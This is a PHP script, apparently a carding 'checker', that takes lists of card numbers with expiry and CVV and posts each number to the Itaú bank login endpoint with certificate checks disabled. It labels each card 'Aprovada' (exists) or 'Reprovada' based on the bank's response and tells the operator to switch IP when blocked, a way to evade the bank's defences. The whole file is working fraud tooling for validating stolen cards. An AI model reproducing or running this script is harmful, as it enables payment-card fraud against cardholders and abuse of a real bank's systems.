<?php

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];

$cc1 = substr ($cc, 0, 4);
$cc2 = substr ($cc, 4, 4);
$cc3 = substr ($cc, 8, 4);
$cc4 = substr ($cc, 12, 4);

# puxar 2 últimos números
$t = strlen($ano);
if ($t > 2){
  $ano = substr($ano, 2,4);
}
$bin = substr($cc, 0,8);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,    'https://internetnc4.itau.com.br/router-app/router');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  

'Content-Type: application/x-www-form-urlencoded',

'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));


curl_setopt($ch, CURLOPT_POSTFIELDS, "usuario.cartao=$cc&usuario.cpf=&portal=999&pre-login=pre-login&destino=&tipoLogon=9");
$data = curl_exec($ch);

#echo $data;

if (strpos($data, 'Print de exemplo, onde um cliente consulta sua fatura enviando mensagens para o Itaucard pelo WhatsApp.')){
 echo ("<span class='badge badge-success'>#Aprovada</span><span style='color:white;'> $lista -> (CARTÃO EXISTENTE)</span> <br />");
 exit();
}
elseif (strpos($data, 'Caso o erro continue, entre em contato com a central de atendimento.')){
  echo "<span class='badge badge-danger'>#Reprovada</span>";
 echo("<span style='color:black;'> $lista</span> -> CARTÃO INEXISTENTE<span class='badge badge-light'> [@JhonDelas1914]</span>");}
  
  

else{
 echo "<span class='badge badge-danger'>#Reprovada</span>";
 echo("<span style='color:black;'> $lista</span> —> TROQUE IP! <span class='badge badge-light'> [@JhonDelas1914]</span><br />");}
 exit();
?>
